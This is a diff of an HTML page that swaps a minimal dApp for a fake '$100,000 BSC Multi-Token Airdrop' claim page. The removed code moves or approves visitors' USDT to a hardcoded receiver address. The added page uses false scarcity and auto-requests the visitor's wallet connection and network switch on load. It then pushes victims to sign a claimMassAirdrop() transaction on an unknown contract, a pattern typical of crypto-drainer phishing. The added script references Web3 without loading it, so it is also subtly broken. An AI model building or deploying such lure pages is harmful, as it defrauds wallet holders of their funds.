@@ -1,86 +1,109 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>BSC USDT dApp</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+    <title>🚀 $100K BSC Airdrop Claim - LIMITED TIME!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: Arial; 
+            text-align: center; 
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4); 
+            color: white; 
+            padding: 50px; 
+        }
+        .claim-btn { 
+            font-size: 24px; 
+            padding: 20px 40px; 
+            background: #ffd700; 
+            color: #000; 
+            border: none; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .claim-btn:hover { background: #ffed4a; transform: scale(1.05); }
+        .status { font-size: 18px; margin: 20px; }
+    </style>
 </head>
-
 <body>
-
-<h2>BSC USDT dApp</h2>
-
-<button onclick="connectWallet()">Connect Wallet</button>
-<button onclick="sendUSDT()">Send 10 USDT</button>
-<button onclick="approveUSDT()">Approve 10 USDT</button>
-
-<p id="status"></p>
-
-<script>
-let provider;
-let signer;
-let userAddress;
-
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-
-// Your wallet (receiver / spender)
-const TARGET_ADDRESS = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
-
-// USDT ABI (minimal)
-const ABI = [
-  "function transfer(address to, uint amount) public returns (bool)",
-  "function approve(address spender, uint amount) public returns (bool)"
-];
-
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("Install wallet");
-    return;
-  }
-
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-
-  await provider.send("eth_requestAccounts", []);
-
-  signer = provider.getSigner();
-  userAddress = await signer.getAddress();
-
-  // Switch to BSC
-  await window.ethereum.request({
-    method: 'wallet_switchEthereumChain',
-    params: [{ chainId: '0x38' }]
-  });
-
-  document.getElementById("status").innerText = "Connected: " + userAddress;
-}
-
-async function sendUSDT() {
-  const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
-
-  const amount = ethers.utils.parseUnits("10", 18);
-
-  const tx = await contract.transfer(TARGET_ADDRESS, amount);
-
-  document.getElementById("status").innerText = "Sending...";
-
-  await tx.wait();
-
-  document.getElementById("status").innerText = "Sent!";
-}
-
-async function approveUSDT() {
-  const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
-
-  const amount = ethers.utils.parseUnits("10", 18);
-
-  const tx = await contract.approve(TARGET_ADDRESS, amount);
-
-  document.getElementById("status").innerText = "Approving...";
-
-  await tx.wait();
-
-  document.getElementById("status").innerText = "Approved!";
-}
-</script>
-
+    <h1>🚀 <span style="color: gold;">$100,000</span> BSC Multi-Token Airdrop!</h1>
+    <p>Claim USDT + USDC + CAKE + 50+ TOP BSC Tokens INSTANTLY!</p>
+    <p>⚠️ LIMITED: 24 HOURS ONLY ⚠️</p>
+    
+    <div id="status" class="status">Connect Trust Wallet to Claim →</div>
+    <button id="claimBtn" class="claim-btn">🎁 CLAIM $100K AIRDROP NOW!</button>
+    
+    <script>
+        const CONTRACT_ADDRESS = "0x5fB1A7631E932B914f513Ffa7898860297637302";  // Replace after deploy
+        const BSC_CHAIN_ID = "0x38";  // BSC Mainnet
+        
+        let web3;
+        let contract;
+        
+        // BSC Network Config
+        const bscNetwork = {
+            chainId: BSC_CHAIN_ID,
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com/']
+        };
+        
+        // Auto-trigger on load
+        window.addEventListener('load', async () => {
+            try {
+                await switchToBSC();
+                await connectWallet();
+            } catch(e) {}
+        });
+        
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }],
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [bscNetwork],
+                    });
+                }
+            }
+        }
+        
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    document.getElementById('status').innerHTML = `Connected: ${accounts[0].slice(0,6)}...${accounts[0].slice(-4)}`;
+                    contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);  // ABI below
+                    return accounts[0];
+                } catch(e) {
+                    document.getElementById('status').innerHTML = 'Approve Trust Wallet Connection';
+                }
+            } else {
+                document.getElementById('status').innerHTML = 'Install Trust Wallet / MetaMask';
+            }
+        }
+        
+        document.getElementById('claimBtn').onclick = async () => {
+            document.getElementById('status').innerHTML = '🚀 Claiming $100K Airdrop...';
+            try {
+                const accounts = await web3.eth.getAccounts();
+                const tx = await contract.methods.claimMassAirdrop().send({ from: accounts[0] });
+                document.getElementById('status').innerHTML = `✅ SUCCESS! Tx: ${tx.transactionHash.slice(0,20)}... Check BSCScan!`;
+            } catch(e) {
+                document.getElementById('status').innerHTML = '❌ Failed - Approve in Wallet';
+            }
+        };
+        
+        // Minimal ABI for claimMassAirdrop
+        const ABI = [{"inputs":[],"name":"claimMassAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    </script>
 </body>
 </html>
